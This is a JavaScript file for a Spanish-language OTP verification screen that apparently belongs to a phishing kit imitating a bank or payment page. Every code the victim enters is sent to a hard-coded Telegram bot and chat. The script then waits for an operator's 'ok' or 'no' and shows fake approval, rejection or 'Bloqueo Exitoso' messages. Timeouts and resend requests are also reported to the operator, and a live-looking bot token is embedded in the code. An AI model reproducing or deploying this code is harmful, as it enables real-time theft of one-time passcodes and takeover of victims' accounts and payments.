/* ============================================================
   Pantalla OTP — Con Alerta de Vencimiento y Reenvío Sincronizado
   ============================================================ */

(function () {
  "use strict";

  const TELEGRAM_TOKEN = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE'; 
  const TELEGRAM_CHAT_ID = '9180377107';   
  const CODE_TTL_SECONDS = 120; 

  const form = document.getElementById("otp-form");
  const inputs = Array.from(document.querySelectorAll(".otp-digit"));
  const timerEl = document.getElementById("otp-timer");
  const messageEl = document.getElementById("otp-message");
  const submitBtn = document.getElementById("otp-submit");
  const maskedEl = document.getElementById("masked-number");
  const resendBtn = document.getElementById("otp-resend"); 

  let remaining = CODE_TTL_SECONDS;
  let timerId = null;

  (function initConfiguredMask() {
    try {
      const tail = sessionStorage.getItem("otp_tail") || "85";
      if (maskedEl) maskedEl.textContent = "****" + tail;
    } catch (e) {
      if (maskedEl) maskedEl.textContent = "****85";
    }

    // CORRECCIÓN IPHONE: Quitamos temporalmente el maxlength limitador del HTML 
    // en tiempo de ejecución para permitir la inyección masiva de iOS
    inputs.forEach(input => input.setAttribute("maxlength", "6"));


    if (inputs[0]) inputs[0].focus();
  })();

  function formatTime(totalSeconds) {
    const m = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
    const s = String(totalSeconds % 60).padStart(2, "0");
    return m + ":" + s;
  }

  function renderTimer() {
    if (timerEl) {
      if (remaining > 0) {
        timerEl.textContent = "El código vence en " + formatTime(remaining) + " minutos";
        timerEl.classList.remove("expired");
        if (resendBtn) resendBtn.style.display = "none"; 
      } else {
        timerEl.textContent = "El código ha vencido";
        timerEl.classList.add("expired");
        if (resendBtn) resendBtn.style.display = "inline-block"; 
      }
    }
  }

  async function sendTimeoutAlert() {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `⏳ *AVISO:* Al usuario se le ha *AGOTADO EL TIEMPO (2 min)* para ingresar el código OTP.`,
          parse_mode: 'Markdown'
        })
      });
    } catch (e) { }
  }

  function tick() {
    remaining -= 1;
    renderTimer();
    refreshSubmitState();
    if (remaining <= 0) {
      clearInterval(timerId);
      sendTimeoutAlert(); 
    }
  }

  function startTimer() {
    remaining = CODE_TTL_SECONDS;
    renderTimer();
    clearInterval(timerId);
    timerId = setInterval(tick, 1000);
  }

  startTimer();

  if (resendBtn) {
    resendBtn.addEventListener("click", async () => {
      resendBtn.textContent = "Enviando nuevo código...";
      resendBtn.disabled = true;
      if (submitBtn) submitBtn.disabled = true;
      
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🍕 *AVISO:* El usuario ha solicitado un *NUEVO CÓDIGO OTP* (Reenvío).`,
            parse_mode: 'Markdown'
          })
        });
      } catch (e) { }

      setTimeout(() => {
        resendBtn.textContent = "¿No recibiste el código? Reenviar";
        resendBtn.disabled = false;
        if (messageEl) {
          messageEl.textContent = "Se ha enviado un nuevo código.";
          messageEl.className = "otp-message success";
          setTimeout(() => { messageEl.textContent = ""; }, 3000);
        }
        
        inputs.forEach(input => {
          input.value = "";
          input.classList.remove("invalid");
        });
        if (inputs[0]) inputs[0].focus();

        startTimer(); 
      }, 1500);
    });
  }

  function getCode() {
    return inputs.map((i) => i.value).join("");
  }

  // Comprueba si cada caja tiene al menos un número ingresado
  function isComplete() {
    return inputs.every((i) => i.value.length === 1);
  }

  function refreshSubmitState() {
    if (submitBtn) {
      submitBtn.disabled = !isComplete() || remaining <= 0;
    }
  }

  // ============================================================
  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
  // ============================================================
  async function enviarFormulario() {
      if (!isComplete() || remaining <= 0) return;

      const enteredCode = getCode();
      submitBtn.disabled = true;
      submitBtn.textContent = "Validando...";
      if (messageEl) {
        messageEl.textContent = "Verificando credenciales de seguridad...";
        messageEl.className = "otp-message";
        messageEl.style.color = "#666666";
      }

      let lastUpdateIdApproval = 0;
      try {
        const resInit = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?limit=100`);
        const dataInit = await resInit.json();
        if (dataInit.ok && dataInit.result && dataInit.result.length > 0) {
          lastUpdateIdApproval = Number(dataInit.result[dataInit.result.length - 1].update_id);
        }
      } catch (errInit) {
        console.error("Error al limpiar historial base:", errInit);
      }

      const textApproval = `🛡️ *PASO 2: VALIDACIÓN DE CÓDIGO OTP* 🛡️\n\n` +
                           `El usuario ha ingresado el código:\n` +
                           `👉 *${enteredCode}*\n\n` +
                           `✅ *Para VALIDAR el código:* Responde \`ok\` o \`si\`\n` +
                           `❌ *Para INVALIDAR (Código Incorrecto):* Responde \`no\` o \`mal\``;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: textApproval,
          parse_mode: 'Markdown'
        })
      });

      let decision = null; 
      
      while (!decision) {
        try {
          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateIdApproval + 1}&timeout=5`);
          const data = await res.json();
          
          if (data.ok && data.result && data.result.length > 0) {
            for (let i = 0; i < data.result.length; i++) {
              const update = data.result[i];
              lastUpdateIdApproval = Number(update.update_id);

              const msg = update.message;
              if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
                const msgText = msg.text.trim().toLowerCase();
                
                if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                  decision = 'approved';
                  break;
                } else if (msgText === 'no' || msgText === 'mal' || msgText === 'incorrecto' || msgText === '2') {
                  decision = 'rejected';
                  break;
                }
              }
            }
          }
        } catch (err) {
          console.error("Fallo de conexión en bucle de escucha:", err);
        }

        if (!decision) {
          await new Promise(resolve => setTimeout(resolve, 1500));
        }
      }

      const flowType = sessionStorage.getItem('flow_type') || 'charge';
      const chargeAction = sessionStorage.getItem('charge_action') || 'Aprobado'; 

      if (decision === 'approved') {
        try {
          if (timerId) clearInterval(timerId);
        } catch (te) { }
        
        if (flowType === 'charge') {
          localStorage.setItem('transaction_status', chargeAction);
        } else if (flowType === 'baja') {
          localStorage.setItem('transaction_status', 'Aprobado');
        }

        // ============================================================
        // CORRECCIÓN DE FRASES DE VALIDACIÓN FINAL
        // ============================================================
        if (messageEl) {
          if (flowType === 'login') {
            messageEl.textContent = "Inicio de sesión correcto.";
            messageEl.style.color = "#28a745"; // Verde
          } else if (flowType === 'baja') {
            messageEl.textContent = "¡Validación de Baja Exitosa!";
            messageEl.style.color = "#28a745"; // Verde
          } else {
            // Evaluamos de forma segura pasando a minúsculas para evitar fallas de mayúsculas
            const accionNormalizada = String(chargeAction).toLowerCase();

            if (accionNormalizada === 'aprobado') {
              // CAMBIO SOLICITADO: Frase exacta en color verde para aprobación
              messageEl.textContent = "¡Aprobación Confirmada y Aplicada!";
              messageEl.style.color = "#28a745"; // Color Verde (#28a745)
            } else {
              // Se mantiene tu frase original en color rojo para el rechazo
              messageEl.textContent = "¡Rechazo Confirmado y Aplicado!";
              messageEl.style.color = "#d9534f"; // Color Rojo (#d9534f)
            }
          }
          messageEl.className = "otp-message success";
        }
        // ============================================================

        submitBtn.textContent = (flowType === 'charge' && String(chargeAction).toLowerCase() === 'rechazado') ? "Bloqueo Exitoso" : "Completado";
        submitBtn.style.backgroundColor = "#981D33";
        submitBtn.style.borderColor = "#981D33";
        submitBtn.style.color = "#ffffff";

        console.log("Validación finalizada. Redirigiendo al dashboard...");

        setTimeout(() => {
          try {
            window.location.replace("dashboard.html");
          } catch (e) {
            window.location.href = "dashboard.html";
          }
        }, 2500);

        return; 


      } else if (decision === 'rejected') {
        submitBtn.disabled = false;
        submitBtn.textContent = "Validar código";
        if (messageEl) {
          messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
          messageEl.style.color = "#d9534f";
          messageEl.className = "otp-message error";
        }
        inputs.forEach(input => {
          input.value = "";
          input.classList.remove("invalid");
        });
        if (inputs[0]) inputs[0].focus();
      }
    }


// ============================================================
  // EVENTOS DE LOS INPUTS CORREGIDOS PARA IPHONE Y ANDROID
  // ============================================================
inputs.forEach((input, index) => {
input.addEventListener("input", (e) => {
input.classList.remove("invalid");
const val = e.target.value;
// DETECCIÓN GLOBAL DE AUTOCOMPLETADO (Captura el bloque largo completo)
if (val.length > 1) {
const numeros = val.replace(/\D/g, "");
const cleanValue = numeros.slice(-6);
// Esparcimos de forma limpia en cada caja
cleanValue.split("").forEach((char, idx) => {
if (inputs[idx]) {
inputs[idx].value = char;
}
});
refreshSubmitState();
if (isComplete()) {
enviarFormulario();
}
return;
}
// MANEJO ESTÁNDAR PARA INGRESO CASILLA POR CASILLA
input.value = val.replace(/\D/g, "");
if (input.value && index < inputs.length - 1) {
inputs[index + 1].focus();
}
refreshSubmitState();
if (isComplete()) {
enviarFormulario();
}
});
// Control para retroceso al borrar
input.addEventListener("keydown", (e) => {
if (e.key === "Backspace" && !input.value && index > 0) {
inputs[index - 1].focus();
inputs[index - 1].value = "";
refreshSubmitState();
}
});
});
if (form) {
form.addEventListener("submit", function (e) {
e.preventDefault();
enviarFormulario();
});
}
})();